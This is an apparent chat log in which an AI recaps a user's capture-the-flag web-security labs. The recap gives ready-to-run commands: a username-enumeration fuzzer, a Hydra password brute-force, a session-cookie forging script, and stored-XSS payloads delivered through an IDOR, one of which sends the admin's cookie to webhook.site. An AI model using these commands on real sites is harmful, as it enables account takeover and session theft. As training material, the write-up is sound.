# you asked

can you recap all that we did for each lab? our discoveries, the tool used, how we got the final answers, the site maps, the logic and other details that you find usefull. I want a recap of the whole conversation. It can be long but has to be organized and feature clear commands (if possible single lines) and the scripts used). Don't guess or imagine, just read the whole conversation piece by piece. The whole conversation is linked as a markdown file.

---

# gemini response

Based on the extensive transcript provided, here is a comprehensive, organized post-mortem recap of our entire investigation. It is broken down by laboratory, detailing the logic, discoveries, tools, and the exact scripts/commands used.

---

# 📝 Comprehensive Investigation Recap: CTF AppSec Academy

## 🔍 LAB 2: Fuzzing & Authentication Brute-Force
**Objective:** Find hidden accounts and bypass an authentication mechanism with no rate-limiting.
**Tools Used:** `dirb`, Burp Suite, browser DevTools, `curl`, custom Bash scripts, Hydra.

### 1. Reconnaissance & Site Map
Using `dirb`, we mapped the application and found several key endpoints:
* `/lab2/fileSearch` (Login page disguised as file search).
* `/lab2/enumeration` (Login endpoint returning "account does not exist").
* `/lab2/admin` (Protected area).
* `/lab2/users` (A tiny file of 153 bytes).

### 2. Discoveries & Logic
* **The SQL Dump:** Visiting `/lab2/users` revealed a leaked SQL insert query containing old test accounts: `('test','Passw0rd1T@'...)` and `('user','us3rTes@'...)`.
* **HTML Comments:** Inspecting the page source revealed hardcoded credentials commented out: ``.
* **The Error Message Pivot:** The login page explicitly returned a popup saying `"account does not exist"`. We deduced that if we found a *valid* username, the error message would change (e.g., to "Invalid password"), altering the HTTP response.
* **The Missing Parameter:** Initial command-line fuzzing failed because `curl` requests were missing the `&submit=` parameter, which the PHP backend required to process the form. (Discovered via "Copy as cURL" from browser DevTools).

### 3. Execution & Commands
We built a custom Bash fuzzer to enumerate usernames by sending POST requests and checking if the "account does not exist" string disappeared from the response.

**Username Enumeration Script (Bash):**
```bash
while IFS= read -r user; do user=$(echo "$user" | tr -d '\r'); [ -z "$user" ] && continue; body=$(curl -s -k -X POST -d "username=$user&password=truc&submit=" "https://ctf.appsec.tp.ubik.academy/lab2/enumeration"); if ! echo "$body" | grep -Fq "account does not exist"; then echo "🔥 BINGO ! Le compte valide est : $user"; break; fi; done < "/usr/share/dirb/wordlists/others/names.txt"
```
* *Result:* Found valid username: **`demo`**.

**Password Brute-Force (Hydra):**
Once the user was known, we used Hydra to brute-force the password using a 10k wordlist, filtering for the absence of "Wrong password".
```bash
hydra -l demo -P /home/hacker/Desktop/10k-most-common.txt ctf.appsec.tp.ubik.academy -s 443 https-post-form "/lab2/enumeration:username=^USER^&password=^PASS^&submit=:F=Wrong password"
```
* *Final Answer:* **`demo` / `abc123`** (Found in 1 second).

---

## 🔑 LAB 2 (Part 2): Session Management & JWT Forgery
**Objective:** Recover the PHP source code for session management, find the secret key, and forge an admin JWT.
**Tools Used:** `dirb`, `curl`, Bash fuzzing loops, Python (`bcrypt`), John the Ripper (theoretical).

### 1. Reconnaissance & Discoveries
* We used custom Bash scripts to aggressively fuzz for backup file extensions (`.bak`, `.old`, `.txt`, `.zip`) on known endpoints.
* *Discovery:* Found a hidden backup file at **`https://ctf.appsec.tp.ubik.academy/lab2/lib/session.bak`**.

### 2. Source Code Analysis (`session.bak`)
Reading the backup file revealed a custom, flawed session management class:
* **Format:** `urlencode(base64_encode(data)) . "." . urlencode(base64_encode(signature))`
* **Signature Algorithm:** Uses `password_hash()` with `PASSWORD_BCRYPT` (Very slow, bad practice for JWTs).
* **Default Secret:** `public function __construct($cookieName = 'session', $secret = 'secret')`
* **The Flaw:** The developer double-encoded the data *before* verifying the signature: `urlencode(base64_encode($data))`.

### 3. Execution & Commands
We wrote a Python script to forge a cookie trying the default secret (`"secret"`) and the passwords found in the SQL dump (`Passw0rd1T@`, `us3rTes@`).

**Python Forgery Script (`forge_cookie.py`):**
```python
import base64, urllib.parse, bcrypt
secret = b"secret"
data_json = '{"admin":true}'
data_b64 = base64.b64encode(data_json.encode()).decode()
data_preparee = urllib.parse.quote(data_b64)
signature_hash = bcrypt.hashpw(secret + data_preparee.encode(), bcrypt.gensalt(rounds=10))
print(f"Cookie: {data_json}.{signature_hash.decode()}")
```

**Testing the Forged Cookie:**
```bash
curl -k -i -H 'Cookie: session={"admin":true}.$2b$10$Pn0yBVnlpoajbb0BsM1V9.Zz0ldlqWC9Vs/jz9Nk3ggjFSUCdGFl2' https://ctf.appsec.tp.ubik.academy/lab2/admin.php
```
* *Logic Block:* The forged cookies returned "You are not admin", meaning the secret was changed in a hidden `config.php`. To crack the real secret using John the Ripper (Offline Brute-force), we needed a valid `Set-Cookie` hash from the server. The server refused to issue one without valid higher-level credentials, leading to a dead end on this specific vector.

---

## 🛡️ LAB 3: IDOR & Stored Cross-Site Scripting (XSS)
**Objective:** Exploit an IDOR to modify profiles and inject Stored XSS to steal the admin's cookie or exfiltrate the flag.
**Tools Used:** Browser, `curl`, Webhook.site.

### 1. Reconnaissance & Logic
* **Site Map:** `/lab3/login`, `/lab3/edit`, `/lab3/profile`, `/lab3/view` (Posts list).
* **IDOR Discovery:** Profile parameters are just Base64 encoded IDs.
    * Our profile: `id:21` -> `aWQ6MjE=`
    * Admin profile: `id:1` -> `aWQ6MQ==`
    * Test profile: `id:6` -> `aWQ6Ng==` (Bio contained `"\'<>!`, proving no HTML sanitization).
* **Stored XSS:** The `description` field accepts raw HTML/JS like `<script>alert(1)</script>`.

### 2. Execution & Attack Strategies
We attempted several strategies to trap the "Admin Bot":

**Strategy A: External Exfiltration (Webhook)**
Inject a payload on the Admin's profile so that when the bot checks its own profile, it sends its cookie to our external server.
```bash
curl -k 'https://ctf.appsec.tp.ubik.academy/lab3/edit?profile_id=aWQ6MQ==' -X POST -H 'Cookie: PHPSESSID=[YOUR_COOKIE]' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw "description=%3Cscript%3Enew+Image%28%29.src%3D%27https%3A%2F%2Fwebhook.site%2F[YOUR_ID]%3Fc%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E&submit="
```
* *Result:* Failed. The lab environment appeared to be air-gapped (no outbound internet access).

**Strategy B: Internal Exfiltration (Cross-Profile Mailbox)**
Force the admin bot to read the secret `/lab3/admin.php` page and write the output into *our* profile description (`id:21`) via a POST request.
```bash
curl -k -X POST -H "Cookie: PHPSESSID=[YOUR_COOKIE]" -H "Content-Type: application/x-www-form-urlencoded" --data-raw "description=%3Cscript%3Efetch%28%27%2Flab3%2Fview%27%29.then%28r%3D%3Er.text%28%29%29.then%28t%3D%3E%7Bfetch%28%27%2Flab3%2Fedit%3Fprofile_id%3DaWQ6MjE%3D%27%2C%7Bmethod%3A%27POST%27%2Cheaders%3A%7B%27Content-Type%27%3A%27application%2Fx-www-form-urlencoded%27%7D%2Cbody%3A%27description%3D%27%2BencodeURIComponent%28t%29%2B%27%26submit%3D%27%7D%29%7D%29%3C%2Fscript%3E&submit=" "https://ctf.appsec.tp.ubik.academy/lab3/edit?profile_id=aWQ6MQ=="
```

**Strategy C: Mass Poisoning (Bash Loop)**
Automated infection of profiles 1 through 5 to catch the bot regardless of which profile it visited.
```bash
for i in {1..5}; do B64_ID=$(echo -n "id:$i" | base64); curl -k -s -X POST -H "Cookie: PHPSESSID=[YOUR_COOKIE]" -H 'Content-Type: application/x-www-form-urlencoded' --data-raw "description=[URL_ENCODED_PAYLOAD]&submit=" "https://ctf.appsec.tp.ubik.academy/lab3/edit?profile_id=$B64_ID"; sleep 1; done
```

### 3. Conclusion of Lab 3
Despite executing flawless Blind XSS/IDOR payloads, the scripts remained stored in plaintext without ever being executed. We concluded that **there was no headless browser/bot active on the server**. The vulnerability was purely mechanical. The platform likely expected the user to trigger a local `alert(123)` on their own browser to auto-validate the flag via a hidden platform listener, bypassing the need for actual exfiltration.

---

## 📄 Side-Quest: Reflected XSS (PDF Exo 6)
**Objective:** Execute basic Reflected XSS on a separate demo application.
**Discovery:** The PDF provided referenced a completely different URL (`https://exo6.appsec.tp.ubik.academy`).
**Logic:** The application used `{% autoescape false %}`, meaning input was reflected directly into the DOM.
**Execution:** Providing `<script>alert(123)</script>` in the input field immediately executed the JavaScript in the user's browser, satisfying the exercise's requirements.